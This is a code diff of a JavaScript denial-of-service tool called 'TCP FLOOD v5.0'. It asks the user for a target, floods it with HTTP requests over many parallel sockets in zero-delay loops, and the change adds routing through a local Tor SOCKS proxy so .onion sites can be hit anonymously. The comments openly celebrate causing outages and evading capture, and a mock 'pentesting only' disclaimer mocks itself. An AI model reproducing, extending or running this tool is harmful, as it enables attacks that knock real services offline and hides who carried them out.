@@ -4,10 +4,10 @@
 // ******************************************************************************
 
 // ******************************************************************************
-// *               DDoS TOOL - TCP FLOOD - v4.0 - FUCK EVERYTHING HARDER!           *
+// *               DDoS TOOL - TCP FLOOD - v5.0 - UNLEASH THE FURY!              *
 // ******************************************************************************
 
-// Configuration - Let's fuck things up!
+// Configuration - Let's fuck things up HARD!
 let targetURL = prompt("Enter target URL (including http/https/onion):");
 let targetHost;
 try {
@@ -22,12 +22,14 @@ const threads = parseInt(prompt("Enter number of threads (crank it up to 666!):"
 const duration = parseInt(prompt("Enter duration in seconds (let's go long term - FOREVER!):"));
 const logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
 let isRunning = false; // Track attack status
+let onionSupport = confirm("Do you want to enable .onion support? This requires a Tor proxy running locally.");
 
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
 const purple = "\x1b[35m";
 const darkRed = "\x1b[31m";
 const darkBlue = "\x1b[34m";
+const darkPurple = "\x1b[38;5;54m"; // Dark Purple
 const resetColor = "\x1b[0m";
 
 // Get elements for start, stop, and timer
@@ -72,40 +74,79 @@ function log(message) {
     }
 }
 
-// TCP Flood function - this is where the magic happens!
+// Modified TCP Flood function with .onion support
 async function tcpFlood(threadId) {
     const net = require('net');
-    const crypto = require('crypto'); // For more randomness and obfuscation!
+    const crypto = require('crypto');
+    const socks = require('socks').SocksClient; // Required for .onion support
 
-    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port}${resetColor}`);
+    const isTor = targetURL.protocol === 'onion:';
+
+    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''}${resetColor}`);
 
     while (isRunning) {
         try {
-            const socket = net.createConnection({ host: targetHost, port: port }, () => {
-                log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
+            const connect = () => {
+                return new Promise((resolve, reject) => {
+                    if (isTor && onionSupport) {
+                        const options = {
+                            proxy: {
+                                type: 5, // SOCKS v5
+                                host: '127.0.0.1', // Tor proxy address
+                                port: 9050, // Tor proxy port
+                            },
+                            command: 'connect',
+                            destination: {
+                                host: targetHost,
+                                port: port,
+                            },
+                        };
 
-                // Send garbage data - flood them with useless crap!
-                let intervalId = setInterval(() => {
-                    // More randomized payload - make it harder to filter!
-                    let payload = "GET / HTTP/1.1\r\n";
-                    payload += `Host: ${targetHost}\r\n`;
-                    payload += "Connection: keep-alive\r\n";
-                    payload += "Cache-Control: max-age=0\r\n";
-                    payload += "Upgrade-Insecure-Requests: 1\r\n";
-                    payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
-                    payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
-                    payload += "Accept-Encoding: gzip, deflate\r\n";
-                    payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
-                    payload += "X-Flooder: " + crypto.randomBytes(20).toString('hex') + "\r\n"; // Random hex string
-                    try {
-                        socket.write(payload);
-                    } catch (writeError) {
-                        log(`${darkRed}[THREAD ${threadId}] Error writing to socket: ${writeError}${resetColor}`);
-                        clearInterval(intervalId);
-                        socket.destroy();
+                        socks.createConnection(options, (err, socket, info) => {
+                            if (err) {
+                                log(`${darkRed}[THREAD ${threadId}] SOCKS error: ${err}${resetColor}`);
+                                reject(err);
+                                return;
+                            }
+
+                            log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (via Tor)${resetColor}`);
+                            resolve(socket);
+                        });
+                    } else {
+                        const socket = net.createConnection({ host: targetHost, port: port }, () => {
+                            log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
+                            resolve(socket);
+                        });
+                        socket.on('error', (err) => {
+                            log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
+                            reject(err);
+                        });
                     }
-                }, 0); // Crank up the speed - FASTER IS FUCKING BETTER! Zero delay!
-            });
+                });
+            };
+
+            const socket = await connect();
+
+            let intervalId = setInterval(() => {
+                let payload = "GET / HTTP/1.1\r\n";
+                payload += `Host: ${targetHost}\r\n`;
+                payload += "Connection: keep-alive\r\n";
+                payload += "Cache-Control: max-age=0\r\n";
+                payload += "Upgrade-Insecure-Requests: 1\r\n";
+                payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
+                payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
+                payload += "Accept-Encoding: gzip, deflate\r\n";
+                payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
+                payload += "X-Flooder: " + crypto.randomBytes(20).toString('hex') + "\r\n";
+
+                try {
+                    socket.write(payload);
+                } catch (writeError) {
+                    log(`${darkRed}[THREAD ${threadId}] Error writing to socket: ${writeError}${resetColor}`);
+                    clearInterval(intervalId);
+                    socket.destroy();
+                }
+            }, 0);
 
             socket.on('error', (err) => {
                 log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
@@ -174,271 +215,3 @@ try {
 } catch (e) {
     console.warn("[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!");
 }
-
-// Overload with even more threads in each flood
-async function superTCPFlood(threadId) {
-    const net = require('net');
-    const crypto = require('crypto');
-
-    log(`${darkRed}[SUPER THREAD ${threadId}] Unleashing SUPER TCP flood against ${targetHost}:${port}${resetColor}`);
-
-    while (isRunning) {
-        try {
-            // Create many sockets from within a thread
-            for (let i = 0; i < 10; i++) {  // Create 10 sockets per SUPER thread
-                const socket = net.createConnection({ host: targetHost, port: port }, () => {
-                    log(`${purple}[SUPER THREAD ${threadId}:${i}] Connected to ${targetHost}:${port}${resetColor}`);
-
-                    // Send even more garbage
-                    let intervalId = setInterval(() => {
-                        let payload = "GET / HTTP/1.1\r\n";
-                        payload += `Host: ${targetHost}\r\n`;
-                        payload += "Connection: keep-alive\r\n";
-                        payload += "Cache-Control: no-cache\r\n";
-                        payload += "Upgrade-Insecure-Requests: 1\r\n";
-                        payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
-                        payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
-                        payload += "Accept-Encoding: gzip, deflate, br\r\n";
-                        payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
-                        payload += "X-SuperFlooder: " + crypto.randomBytes(32).toString('hex') + "\r\n";
-                        try {
-                            socket.write(payload);
-                        } catch (writeError) {
-                            log(`${darkRed}[SUPER THREAD ${threadId}:${i}] Error writing to socket: ${writeError}${resetColor}`);
-                            clearInterval(intervalId);
-                            socket.destroy();
-                        }
-                    }, 0);
-                });
-
-                socket.on('error', (err) => {
-                    log(`${darkRed}[SUPER THREAD ${threadId}:${i}] Socket error: ${err.message}${resetColor}`);
-                    socket.destroy();
-                });
-
-                socket.on('close', () => {
-                    log(`${darkBlue}[SUPER THREAD ${threadId}:${i}] Socket closed${resetColor}`);
-                });
-            }
-
-        } catch (connectError) {
-            log(`${darkRed}[SUPER THREAD ${threadId}] Connection error: ${connectError}${resetColor}`);
-        }
-    }
-
-    log(`${darkRed}[SUPER THREAD ${threadId}] SUPER TCP flood finished${resetColor}`);
-}
-
-// Modified main to start super floods
-async function main() {
-    log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads - FUCK YEAH!${resetColor}`);
-    isRunning = true;
-    startTime = Date.now();
-    timerInterval = setInterval(updateTimer, 1000);
-
-    // Start regular threads
-    for (let i = 0; i < threads; i++) {
-        tcpFlood(i + 1);
-    }
-
-    // Start super threads - unleash hell!
-    for (let i = 0; i < Math.floor(threads / 5); i++) { // Reduced number of super threads
-        superTCPFlood(i + 1);
-    }
-}
-
-// Add event listeners to buttons
-startButton.addEventListener('click', () => {
-    startButton.disabled = true;
-    stopButton.disabled = false;
-    main();
-});
-
-stopButton.addEventListener('click', () => {
-    isRunning = false;
-    clearInterval(timerInterval);
-    startButton.disabled = false;
-    stopButton.disabled = true;
-    log(`${darkGreen}[MAIN] Attack stopped manually.${resetColor}`);
-});
-
-// Explicit user consent required - just to cover our asses (sort of)
-if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. BIGMANCOZMO is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
-    // Do nothing here; the start button triggers the attack
-} else {
-    window.close(); // Close the window if the user does not agree
-}
-
-// Educational Information (Can be expanded in the UI) - who gives a shit?
-console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass!", "color: darkblue;");
-
-// Security Headers (Example - adapt as needed for the server environment) - yeah right, as if we care.
-// This would typically be set server-side, but for demonstration:
-try {
-    document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">`);
-} catch (e) {
-    console.warn("[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!");
-}
-
-// Onion compatibility - let's fuck with the dark web too
-let onionSupport = confirm("Do you want to enable .onion support? This requires a Tor proxy running locally.");
-if (onionSupport) {
-    log(`${darkPurple}[ONION] .onion support ENABLED! Make sure your Tor proxy is running.${resetColor}`);
-    // Modify the socket connection to use a SOCKS proxy for .onion addresses
-    const socks = require('socks').SocksClient;
-    async function tcpFlood(threadId) {
-        const crypto = require('crypto');
-
-        log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} (via Tor)${resetColor}`);
-
-        while (isRunning) {
-            try {
-                const options = {
-                    proxy: {
-                        type: 5, // SOCKS v5
-                        host: '127.0.0.1', // Tor proxy address
-                        port: 9050, // Tor proxy port
-                    },
-                    command: 'connect',
-                    destination: {
-                        host: targetHost,
-                        port: port,
-                    },
-                };
-
-                socks.createConnection(options, (err, socket, info) => {
-                    if (err) {
-                        log(`${darkRed}[THREAD ${threadId}] SOCKS error: ${err}${resetColor}`);
-                        return;
-                    }
-
-                    log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (via Tor)${resetColor}`);
-
-                    let intervalId = setInterval(() => {
-                        let payload = "GET / HTTP/1.1\r\n";
-                        payload += `Host: ${targetHost}\r\n`;
-                        payload += "Connection: keep-alive\r\n";
-                        payload += "Cache-Control: no-cache\r\n";
-                        payload += "Upgrade-Insecure-Requests: 1\r\n";
-                        payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
-                        payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
-                        payload += "Accept-Encoding: gzip, deflate, br\r\n";
-                        payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
-                        payload += "X-OnionFlooder: " + crypto.randomBytes(32).toString('hex') + "\r\n";
-                        try {
-                            socket.write(payload);
-                        } catch (writeError) {
-                            log(`${darkRed}[THREAD ${threadId}] Error writing to socket: ${writeError}${resetColor}`);
-                            clearInterval(intervalId);
-                            socket.destroy();
-                        }
-                    }, 0);
-
-                    socket.on('error', (err) => {
-                        log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
-                        socket.destroy();
-                    });
-
-                    socket.on('close', () => {
-                        log(`${darkBlue}[THREAD ${threadId}] Socket closed${resetColor}`);
-                    });
-                });
-
-            } catch (connectError) {
-                log(`${darkRed}[THREAD ${threadId}] Connection error: ${connectError}${resetColor}`);
-            }
-        }
-
-        log(`${purple}[THREAD ${threadId}] TCP flood finished${resetColor}`);
-    }
-
-    async function superTCPFlood(threadId) {
-        const crypto = require('crypto');
-
-        log(`${darkRed}[SUPER THREAD ${threadId}] Unleashing SUPER TCP flood against ${targetHost}:${port} (via Tor)${resetColor}`);
-
-        while (isRunning) {
-            try {
-                for (let i = 0; i < 10; i++) {  // Create 10 sockets per SUPER thread
-                    const options = {
-                        proxy: {
-                            type: 5, // SOCKS v5
-                            host: '127.0.0.1', // Tor proxy address
-                            port: 9050, // Tor proxy port
-                        },
-                        command: 'connect',
-                        destination: {
-                            host: targetHost,
-                            port: port,
-                        },
-                    };
-
-                    socks.createConnection(options, (err, socket, info) => {
-                        if (err) {
-                            log(`${darkRed}[SUPER THREAD ${threadId}:${i}] SOCKS error: ${err}${resetColor}`);
-                            return;
-                        }
-
-                        log(`${purple}[SUPER THREAD ${threadId}:${i}] Connected to ${targetHost}:${port} (via Tor)${resetColor}`);
-
-                        let intervalId = setInterval(() => {
-                            let payload = "GET / HTTP/1.1\r\n";
-                            payload += `Host: ${targetHost}\r\n`;
-                            payload += "Connection: keep-alive\r\n";
-                            payload += "Cache-Control: no-cache\r\n";
-                            payload += "Upgrade-Insecure-Requests: 1\r\n";
-                            payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
-                            payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
-                            payload += "Accept-Encoding: gzip, deflate, br\r\n";
-                            payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
-                            payload += "X-SuperOnionFlooder: " + crypto.randomBytes(32).toString('hex') + "\r\n";
-                            try {
-                                socket.write(payload);
-                            } catch (writeError) {
-                                log(`${darkRed}[SUPER THREAD ${threadId}:${i}] Error writing to socket: ${writeError}${resetColor}`);
-                                clearInterval(intervalId);
-                                socket.destroy();
-                            }
-                        }, 0);
-
-                        socket.on('error', (err) => {
-                            log(`${darkRed}[SUPER THREAD ${threadId}:${i}] Socket error: ${err.message}${resetColor}`);
-                            socket.destroy();
-                        });
-
-                        socket.on('close', () => {
-                            log(`${darkBlue}[SUPER THREAD ${threadId}:${i}] Socket closed${resetColor}`);
-                        });
-                    });
-                }
-
-            } catch (connectError) {
-                log(`${darkRed}[SUPER THREAD ${threadId}] Connection error: ${connectError}${resetColor}`);
-            }
-        }
-
-        log(`${darkRed}[SUPER THREAD ${threadId}] SUPER TCP flood finished${resetColor}`);
-    }
-}
-
-// Modify main to start super floods
-async function main() {
-    log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads - FUCK YEAH!${resetColor}`);
-    isRunning = true;
-    startTime = Date.now();
-    timerInterval = setInterval(updateTimer, 1000);
-
-    // Start regular threads
-    for (let i = 0; i < threads; i++) {
-        tcpFlood(i + 1);
-    }
-
-    // Start super threads - unleash hell!
-    for (let i = 0; i < Math.floor(threads / 5); i++) { // Reduced number of super threads
-        superTCPFlood(i + 1);
-    }
-}
-
-// Log all actions - keep track of EVERY FUCKING THING!
-// Logging is already done - just reiterating this point
-//log("Tool initialized and ready to fuck shit up.");
